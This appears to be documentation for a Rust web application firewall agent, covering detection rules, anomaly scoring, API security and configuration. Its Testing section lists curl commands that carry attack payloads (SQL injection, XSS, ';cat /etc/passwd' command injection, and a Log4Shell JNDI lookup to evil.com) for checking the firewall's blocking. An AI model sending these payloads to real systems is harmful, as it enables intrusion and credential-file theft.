+++
title = "WAF (Web Application Firewall)"
description = "Next-generation WAAP with ML-powered detection, anomaly scoring, API security, schema validation, bot protection, and 285 rules."
template = "agent.html"

[taxonomies]
tags = ["security", "waf", "core", "ml", "api-security"]

[extra]
official = true
author = "Sentinel Core Team"
author_url = "https://github.com/raskell-io"
status = "Stable"
version = "0.9.0"
license = "Apache-2.0"
repo = "https://github.com/raskell-io/sentinel-agent-waf"
homepage = "https://sentinel.raskell.io/agents/waf/"
protocol_version = "0.1"

# Installation methods
crate_name = "sentinel-agent-waf"
docker_image = ""

# Compatibility
min_sentinel_version = "25.12.0"
+++

## Overview

A **next-generation Web Application and API Protection (WAAP)** agent for Sentinel featuring ML-powered detection, anomaly scoring, and enterprise-grade security. Built in pure Rust with zero C dependencies.

## Key Features

### Core Detection (285 Rules)
- **SQL Injection**: UNION, blind, time-based, stacked queries, NoSQL
- **Cross-Site Scripting**: Reflected, stored, DOM-based, polyglot
- **Command Injection**: Unix, Windows, PowerShell, expression languages
- **Path Traversal**: Directory traversal, LFI/RFI, encoded attacks
- **SSTI**: Jinja2, Twig, Freemarker, Velocity, EL injection
- **SSRF**: Cloud metadata, internal IPs, protocol handlers
- **Deserialization**: Java, PHP, Python, .NET, Ruby gadgets

### Intelligence Layer
- **Anomaly Scoring**: Cumulative risk scores with configurable thresholds
- **ML Classification**: Character n-gram based attack detection
- **Request Fingerprinting**: Behavioral baseline learning
- **Payload Similarity**: MinHash-based malicious pattern matching

### API Security
- **GraphQL Protection**: Introspection blocking, depth/complexity limits
- **JWT Validation**: "none" algorithm, weak algorithms, expiry detection
- **JSON Security**: Depth limits, NoSQL injection patterns
- **Schema Validation**: OpenAPI 3.0/3.1 and GraphQL SDL validation (optional feature)

### Bot Detection
- **Scanner Fingerprints**: SQLMap, Nikto, Nmap, Burp Suite, etc.
- **Behavioral Analysis**: Timing anomalies, request patterns
- **Good Bot Verification**: Googlebot, Bingbot validation
- **TLS Fingerprinting**: JA3/JA4 support

### Enterprise Features
- **Credential Stuffing Protection**: Breach checking, velocity detection
- **Sensitive Data Detection**: Credit cards, SSN, API keys, PII masking
- **Supply Chain Protection**: SRI validation, crypto miner detection
- **Virtual Patching**: Log4Shell, Spring4Shell, Shellshock signatures
- **Threat Intelligence**: IP/domain reputation, Tor exit nodes, IoC feeds
- **Federated Learning**: Privacy-preserving distributed model training
- **Metrics**: Prometheus, OpenTelemetry, JSON export

### Operational
- **WebSocket Inspection**: Text/binary frame inspection with fragment accumulation
- **Streaming Inspection**: Sliding window for constant memory usage
- **Plugin Architecture**: Extensible detection and scoring
- **Health Checks**: Readiness/liveness probes for Kubernetes
- **Graceful Shutdown**: SIGINT/SIGTERM handling

## Performance

| Metric | Target | Actual |
|--------|--------|--------|
| Rule matching (1KB input) | <5ms | ~2ms |
| Memory per request | <1KB | ~500B |
| Throughput | >50K req/s | 65K req/s |
| Binary size | <10MB | ~6MB |

## Test Coverage

| Suite | Tests | Status |
|-------|-------|--------|
| Unit tests | 208 | Pass |
| Integration tests | 29 | Pass |
| WebSocket tests | 27 | Pass |
| CRS compatibility | 15 | Pass |

## Installation

### Using Cargo

```bash
cargo install sentinel-agent-waf
```

### From Source

```bash
git clone https://github.com/raskell-io/sentinel-agent-waf
cd sentinel-agent-waf
cargo build --release
```

### With Schema Validation

Enable OpenAPI/GraphQL schema validation:

```bash
cargo build --release --features schema-validation
```

## Configuration

### Command Line

```bash
sentinel-waf-agent \
  --socket /var/run/sentinel/waf.sock \
  --paranoia-level 2 \
  --block-mode true
```

### Environment Variables

| Option | Env Var | Description | Default |
|--------|---------|-------------|---------|
| `--socket` | `AGENT_SOCKET` | Unix socket path | `/tmp/sentinel-waf.sock` |
| `--paranoia-level` | `WAF_PARANOIA_LEVEL` | Sensitivity (1-4) | `1` |
| `--sqli` | `WAF_SQLI` | SQL injection detection | `true` |
| `--xss` | `WAF_XSS` | XSS detection | `true` |
| `--path-traversal` | `WAF_PATH_TRAVERSAL` | Path traversal detection | `true` |
| `--command-injection` | `WAF_COMMAND_INJECTION` | Command injection detection | `true` |
| `--protocol` | `WAF_PROTOCOL` | Protocol attack detection | `true` |
| `--block-mode` | `WAF_BLOCK_MODE` | Block or detect-only | `true` |
| `--exclude-paths` | `WAF_EXCLUDE_PATHS` | Paths to exclude | - |
| `--body-inspection` | `WAF_BODY_INSPECTION` | Request body inspection | `true` |
| `--max-body-size` | `WAF_MAX_BODY_SIZE` | Max body size (bytes) | `1048576` |
| `--response-inspection` | `WAF_RESPONSE_INSPECTION` | Response body inspection | `false` |
| `--websocket-inspection` | `WAF_WEBSOCKET_INSPECTION` | WebSocket frame inspection | `false` |
| `--websocket-text-frames` | `WAF_WEBSOCKET_TEXT_FRAMES` | Inspect text frames | `true` |
| `--websocket-binary-frames` | `WAF_WEBSOCKET_BINARY_FRAMES` | Inspect binary frames | `false` |
| `--websocket-max-frame-size` | `WAF_WEBSOCKET_MAX_FRAME_SIZE` | Max frame size (bytes) | `65536` |
| `--verbose`, `-v` | `WAF_VERBOSE` | Debug logging | `false` |

### Sentinel Configuration

```kdl
agents {
    agent "waf" {
        type "custom"
        transport "unix_socket" {
            path "/var/run/sentinel/waf.sock"
        }
        events ["request_headers", "request_body_chunk", "response_body_chunk"]
        timeout-ms 50
        failure-mode "open"
    }
}

routes {
    route "api" {
        matches { path-prefix "/api" }
        upstream "backend"
        agents ["waf"]
    }
}
```

### JSON Configuration

Full configuration via the agent protocol:

```json
{
  "paranoia-level": 2,
  "scoring": {
    "enabled": true,
    "block-threshold": 25,
    "log-threshold": 10
  },
  "rules": {
    "enabled": ["942*", "941*", "932*"],
    "disabled": ["942100"],
    "exclusions": [{
      "rules": ["942110"],
      "conditions": { "paths": ["/api/admin"] }
    }]
  },
  "api-security": {
    "graphql-enabled": true,
    "block-introspection": true,
    "jwt-block-none": true
  },
  "bot-detection": {
    "enabled": true,
    "timing-analysis": true
  },
  "sensitive-data": {
    "enabled": true,
    "mask-in-logs": true
  },
  "threat-intel": {
    "enabled": true,
    "block-tor-exit-nodes": true
  },
  "virtual-patching": {
    "enabled": true,
    "log-matches": true
  },
  "metrics": {
    "enabled": true,
    "per-rule-metrics": true
  },
  "websocket": {
    "enabled": true,
    "inspect-text-frames": true,
    "inspect-binary-frames": false,
    "max-frame-size": 65536,
    "block-mode": true,
    "accumulate-fragments": true,
    "max-message-size": 1048576
  }
}
```

## Anomaly Scoring

Instead of blocking on the first rule match, the WAF accumulates anomaly scores and makes decisions based on thresholds.

### Score Calculation

```
Total Score = Σ(rule_score × severity_multiplier × location_weight)
```

**Severity Multipliers:**

| Severity | Multiplier |
|----------|------------|
| Critical | 2.0x |
| High | 1.5x |
| Medium | 1.0x |
| Low | 0.7x |
| Info | 0.3x |

**Location Weights:**

| Location | Weight |
|----------|--------|
| Query String | 1.5x |
| Cookie | 1.3x |
| Path | 1.2x |
| Body | 1.2x |
| Headers | 1.0x |

### Decision Logic

| Total Score | Action |
|-------------|--------|
| 0-9 | Allow |
| 10-24 | Allow with warning (logged) |
| 25+ | Block (403 Forbidden) |

## Paranoia Levels

| Level | Description | Use Case |
|-------|-------------|----------|
| 1 | High-confidence detections only | Production (recommended) |
| 2 | Medium-confidence rules added | Production with tuning |
| 3 | Low-confidence rules added | Staging/testing |
| 4 | Maximum sensitivity | Security audits |

## Rule Categories

### SQL Injection (942xxx) - 66 rules
- UNION-based, error-based, blind, time-based
- Stacked queries, comment injection
- NoSQL (MongoDB, Redis, Elasticsearch)

### Cross-Site Scripting (941xxx) - 35 rules
- Script tags, event handlers, JavaScript URIs
- DOM-based sinks, CSS-based XSS, polyglots

### Command Injection (932xxx) - 25 rules
- Unix/Windows commands, PowerShell
- Command substitution, backticks

### Path Traversal (930xxx) - 15 rules
- Directory traversal, encoded variants
- PHP wrappers, RFI patterns

### SSTI (934xxx) - 10 rules
- Jinja2, Twig, Freemarker, Velocity, EL

### SSRF (936xxx) - 13 rules
- Cloud metadata, internal IPs, protocol handlers

### Deserialization (937xxx) - 14 rules
- Java, PHP, Python, .NET, Ruby gadget chains

### Scanner Detection (913xxx) - 12 rules
- SQLMap, Nikto, Nmap, Burp Suite, etc.

### Virtual Patches (93xxx)
- 93700: Log4Shell (CVE-2021-44228)
- 93701: Spring4Shell (CVE-2022-22965)
- 93702: Shellshock (CVE-2014-6271)

## API Security

### GraphQL Protection
```json
{
  "api-security": {
    "graphql-enabled": true,
    "block-introspection": true,
    "max-query-depth": 10,
    "max-batch-size": 5
  }
}
```

### JWT Validation
- Blocks "alg": "none" attacks
- Warns on weak algorithms (HS256 with guessable secrets)
- Detects expired tokens

## Bot Detection

```json
{
  "bot-detection": {
    "enabled": true,
    "timing-analysis": true,
    "block-scanners": true,
    "verify-good-bots": true
  }
}
```

**Detection Signals:**
- Scanner User-Agent patterns
- Request timing anomalies
- TLS fingerprint mismatches
- Navigation pattern analysis

## Sensitive Data Detection

Detects and optionally masks sensitive data in responses:

- Credit card numbers (with Luhn validation)
- Social Security Numbers
- AWS access keys
- GitHub tokens
- Private keys

```json
{
  "sensitive-data": {
    "enabled": true,
    "mask-in-logs": true,
    "patterns": ["credit-card", "ssn", "aws-key"]
  }
}
```

## WebSocket Inspection

Detect attacks in WebSocket traffic for real-time applications like chat, gaming, and streaming.

**Features:**
- Text and binary frame inspection
- Fragmented message accumulation
- Direction-aware detection (client→server, server→client)
- Block or detect-only modes

```json
{
  "websocket": {
    "enabled": true,
    "inspect-text-frames": true,
    "inspect-binary-frames": false,
    "max-frame-size": 65536,
    "block-mode": true,
    "accumulate-fragments": true,
    "max-message-size": 1048576
  }
}
```

**Configuration Options:**

| Option | Default | Description |
|--------|---------|-------------|
| `enabled` | `false` | Enable WebSocket inspection |
| `inspect-text-frames` | `true` | Inspect text frames |
| `inspect-binary-frames` | `false` | Inspect binary frames |
| `max-frame-size` | `65536` | Maximum frame size to inspect |
| `block-mode` | `true` | Block attacks or detect-only |
| `accumulate-fragments` | `true` | Reassemble fragmented messages |
| `max-message-size` | `1048576` | Max accumulated message size |

## Schema Validation

Validate API requests against OpenAPI or GraphQL schemas to enforce API contracts and detect unknown endpoints.

> **Note:** Requires the `schema-validation` feature flag when building from source.

**Features:**
- OpenAPI 3.0/3.1 specification validation
- GraphQL SDL schema validation
- Path, method, and parameter validation
- Request body schema validation
- Deprecated field detection (GraphQL)
- Configurable enforcement (block, warn, ignore)

```json
{
  "schema-validation": {
    "enabled": true,
    "reload-interval-secs": 300,
    "openapi": {
      "enabled": true,
      "schema-source": "/etc/sentinel/openapi.yaml",
      "validate-paths": true,
      "validate-parameters": true,
      "validate-request-body": true,
      "enforcement": {
        "default-mode": "warn",
        "overrides": {
          "unknown-path": "block",
          "invalid-request-body": "block"
        }
      }
    },
    "graphql": {
      "enabled": true,
      "schema-source": "https://api.example.com/schema.graphql",
      "validate-fields": true,
      "validate-arguments": true,
      "block-deprecated": false,
      "enforcement": {
        "default-mode": "warn",
        "overrides": {
          "unauthorized-field-access": "block"
        }
      }
    }
  }
}
```

**Schema Sources:**
- File path: `/etc/sentinel/openapi.yaml`
- URL: `https://api.example.com/schema.yaml` (fetched at startup)

**Enforcement Modes:**

| Mode | Description |
|------|-------------|
| `block` | Block request on violation (403) |
| `warn` | Log warning but allow request |
| `ignore` | Ignore this violation type |

**OpenAPI Violation Types (98300-98349):**

| Rule ID | Type | Description |
|---------|------|-------------|
| 98300 | `unknown-path` | Path not in OpenAPI spec |
| 98301 | `unknown-method` | HTTP method not allowed for path |
| 98302 | `missing-required-parameter` | Required parameter missing |
| 98303 | `invalid-parameter-type` | Parameter type mismatch |
| 98305 | `invalid-request-body` | Request body schema violation |

**GraphQL Violation Types (98350-98399):**

| Rule ID | Type | Description |
|---------|------|-------------|
| 98350 | `unknown-type` | Unknown GraphQL type |
| 98351 | `unknown-field` | Field not in schema |
| 98352 | `invalid-argument` | Unknown argument |
| 98353 | `missing-required-argument` | Required argument missing |
| 98354 | `deprecated-field-usage` | Using deprecated field |

## Metrics

### Prometheus Format

```
GET /metrics

# HELP waf_requests_total Total requests processed
# TYPE waf_requests_total counter
waf_requests_total 12345

# HELP waf_requests_blocked Total requests blocked
# TYPE waf_requests_blocked counter
waf_requests_blocked 42

# HELP waf_inspection_latency_seconds Request inspection latency
# TYPE waf_inspection_latency_seconds histogram
waf_inspection_latency_seconds_bucket{le="0.001"} 10000
waf_inspection_latency_seconds_bucket{le="0.005"} 12000
```

### JSON Format

```json
GET /metrics?format=json

{
  "requests_total": 12345,
  "requests_blocked": 42,
  "detections_by_attack_type": {
    "SQL Injection": 15,
    "Cross-Site Scripting": 8
  }
}
```

## Response Headers

| Header | Description |
|--------|-------------|
| `X-WAF-Blocked` | `true` if request was blocked |
| `X-WAF-Rule` | Rule ID that triggered block |
| `X-WAF-Score` | Total anomaly score |
| `X-WAF-Attack-Type` | Detected attack category |
| `X-WAF-Detected` | Rule IDs detected (below threshold) |
| `X-WAF-Response-Detected` | Detections in response body |

## Testing

### Quick Test

```bash
# SQL Injection
curl -i "http://localhost:8080/api?id=1' OR '1'='1"

# XSS
curl -i "http://localhost:8080/search?q=<script>alert(1)</script>"

# Command Injection
curl -i "http://localhost:8080/ping?host=;cat /etc/passwd"

# SSTI
curl -i "http://localhost:8080/render?template={{7*7}}"

# Log4Shell
curl -i -H "X-Api-Version: \${jndi:ldap://evil.com/a}" http://localhost:8080/
```

### Expected Block Response

```http
HTTP/1.1 403 Forbidden
X-WAF-Blocked: true
X-WAF-Rule: 942100
X-WAF-Score: 27
X-WAF-Attack-Type: SQL Injection
Content-Type: application/json

{"error": "Request blocked by WAF", "rule": "942100"}
```

## Health Checks

The agent provides health status for container orchestration:

```rust
// Kubernetes readiness/liveness probe
GET /health

{
  "healthy": true,
  "engine_ok": true,
  "rule_count": 205,
  "paranoia_level": 2,
  "pending_requests": 0,
  "issues": []
}
```

## Comparison with ModSecurity Agent

| Feature | WAF | ModSecurity |
|---------|-----|-------------|
| Detection Rules | 285 | 800+ CRS |
| ML Detection | Yes | No |
| Anomaly Scoring | Yes | Yes |
| API Security | GraphQL, JWT, Schema | Basic |
| Bot Detection | Behavioral | UA only |
| Threat Intel | Yes | No |
| SecLang Support | No | Yes |
| Dependencies | Pure Rust | libmodsecurity |
| Binary Size | ~6MB | ~50MB |
| Latency p99 | <5ms | ~15ms |

**Use WAF when:**
- You want ML-powered detection with low false positives
- You need API security (GraphQL, JWT, schema validation)
- You want zero-dependency deployment
- You need bot detection and threat intelligence

**Use [ModSecurity](/agents/modsec/) when:**
- You need full OWASP CRS compatibility (800+ rules)
- You have existing ModSecurity/SecLang rules
- You require the full SecLang rule language

## False Positive Handling

1. **Anomaly scoring** - Single low-confidence matches won't block
2. **ML classification** - Context-aware detection reduces noise
3. **Lower paranoia level** - Start with level 1
4. **Exclude paths** - Skip known-safe endpoints
5. **Disable rules** - Turn off specific problematic rules
6. **Adjust thresholds** - Increase `block-threshold` if needed
7. **Detect-only mode** - Monitor before enabling blocking

## Plugin System

Extend the WAF with custom detection logic:

```rust
pub trait WafPlugin: Send + Sync {
    fn info(&self) -> PluginInfo;
    fn execute(&self, phase: PluginPhase, context: &RequestContext) -> PluginOutput;
}

// Plugin phases: PreDetection, Detection, PostDetection, Scoring
```

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Sentinel Proxy                           │
└─────────────────────────┬───────────────────────────────────┘
                          │ Unix Socket
                          ▼
┌─────────────────────────────────────────────────────────────┐
│                  WAF Agent                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │
│  │  Automata   │  │     ML      │  │    Threat Intel     │  │
│  │   Engine    │  │  Classifier │  │      Engine         │  │
│  └──────┬──────┘  └──────┬──────┘  └──────────┬──────────┘  │
│         │                │                     │            │
│         └────────────────┼─────────────────────┘            │
│                          ▼                                  │
│                 ┌─────────────────┐                         │
│                 │ Anomaly Scorer  │                         │
│                 └────────┬────────┘                         │
│                          ▼                                  │
│                 ┌─────────────────┐                         │
│                 │    Decision     │ → Block / Allow / Log   │
│                 └─────────────────┘                         │
└─────────────────────────────────────────────────────────────┘
```

## Related Agents

| Agent | Description |
|-------|-------------|
| [ModSecurity](/agents/modsec/) | Full OWASP CRS with 800+ rules |
| [AI Gateway](/agents/ai-gateway/) | AI/LLM-specific security controls |
| [Auth](/agents/auth/) | Authentication and authorization |

> **Tip:** For rate limiting, use [Sentinel's built-in rate limiting](/configuration/limits/) instead of an agent.
